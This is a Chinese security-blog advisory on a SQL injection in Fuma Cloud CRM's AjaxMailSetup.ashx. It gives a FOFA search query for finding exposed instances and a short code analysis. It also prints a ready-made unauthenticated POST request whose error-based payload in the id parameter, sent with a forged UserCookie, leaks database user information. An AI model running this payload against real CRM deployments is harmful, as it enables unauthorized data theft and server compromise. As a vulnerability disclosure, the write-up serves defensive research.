---
title: "孚盟云CRM AjaxMailSetup.ashx SQL注入漏洞"
source: https://mrxn.net/jswz/fumacrm-Dingding-Ajax-AjaxMailSetup-sqli.html
asset_dir: assets/孚盟云crm-ajaxmailsetup.ashx-sql注入漏洞
---

# 孚盟云CRM AjaxMailSetup.ashx SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2026/1/21 08:31
* 222浏览
* [0评论](#comment)
* 6分钟阅读

深入探索

网络安全会议

JSON处理工具

网络安全培训


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

上海孚盟软件有限公司是一家专业的外贸SaaS服务和行业解决方案提供商。其旗下产品孚盟云AjaxMailSetup.ashx接口存在多个[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞，未经身份验证的远程攻击者除了可以利用 SQL注入漏洞获取数据库中的信息(例如，管理员后台密码、站点的用户个人信息)之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。

SQL注入检测工具

# 影响版本

# fofa语法

> app="孚盟软件-孚盟云"

# 漏洞分析

直接看 `AjaxMailSetup.ashx` 对应的dll文件 `FumaCRM_BS.NewWeb.dll` 里有关 **AjaxMailSetup** 方法的实现如下

[![孚盟云CRM AjaxMailSetup.ashx SQL注入漏洞](images/img-001-f1978879eb06.webp)](https://image.mrxn.net/e0fd116b7afc432d863eab3c94627d04.webp)

[![孚盟云CRM AjaxMailSetup.ashx SQL注入漏洞](images/img-002-df56b67ac428.webp)](https://image.mrxn.net/f58bf89c542548cb88c9c31a850039cd.webp)

[![孚盟云CRM AjaxMailSetup.ashx SQL注入漏洞](images/img-003-a58ea3687198.webp)](https://image.mrxn.net/70579988736c429c9afff75e3f9472b8.webp)

当**action=lerevnClick**时，进入`lerevnClick`方法

[![孚盟云CRM AjaxMailSetup.ashx SQL注入漏洞](images/img-004-c6c055b53bac.webp)](https://image.mrxn.net/e02b36fcc1304af49951b4c6ba5a57e7.webp)

参数**id**通过短下划线分割后第二个元素被直接拼接进SQL语句中执行，期间无过滤或校验，从而造成[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞。

# 漏洞复现

```
POST /m/Dingding/Ajax/AjaxMailSetup.ashx HTTP/1.1
Host: fumacrm.mrxn.net
Cookie: UserCookie={"empId":"1"}
Content-Type: application/x-www-form-urlencoded

action=lerevnClick&id=1_'-1/user--
```

[![孚盟云CRM AjaxMailSetup.ashx SQL注入漏洞](images/img-005-a791a5c843a9.webp)](https://image.mrxn.net/5d969ebb4e5146c4b2385d8a5e097e18.webp)

成功通过报错注入在响应回显数数据库用户信息

代码安全审计

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#0day](https://mrxn.net/tag/0day)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[孚盟云CRM AjaxMailSetup.ashx SQL注入漏洞](https://mrxn.net/jswz/fumacrm-Dingding-Ajax-AjaxMailSetup-sqli.html)  
文章链接：<https://mrxn.net/jswz/fumacrm-Dingding-Ajax-AjaxMailSetup-sqli.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/fumacrm-Dingding-Ajax-AjaxMailSetup-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

漏洞扫描服务

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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